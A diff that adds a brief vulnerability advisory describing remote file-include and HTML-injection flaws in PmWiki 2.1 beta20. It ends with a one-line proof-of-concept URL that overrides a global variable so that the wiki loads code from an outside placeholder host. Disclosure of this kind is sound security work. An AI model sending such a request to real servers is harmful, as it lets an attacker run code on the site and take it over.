@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/16421/info
+
+PmWiki is prone to multiple input-validation vulnerabilities. These issues are due to failures in the application to properly sanitize user-supplied input.
+
+- Arbitrary remote file-include vulnerability. Exploitation of this issue will result in the execution of attacker-supplied code in the context of the webserver process. This may facilitate a compromise of the application and the underlying system.
+
+- Unspecified HTML-injection issues. Successful exploitation will permit an attacker to inject arbitrary HTML code. When viewed, this code will be executed in the browser of a victim user in the context of the webserver process. Successful exploitation may aid in the theft of cookie-based authentication credentials, or allow the attacker to control how the site is rendered to the user; other attacks are also possible.
+
+These issues affect version 2.1 beta20; other versions may also be vulnerable. 
+
+http://www.example.com/pmwiki-2.1.beta20/pmwiki.php?GLOBALS&GLOBALS[FarmD]=http://www.example.com 
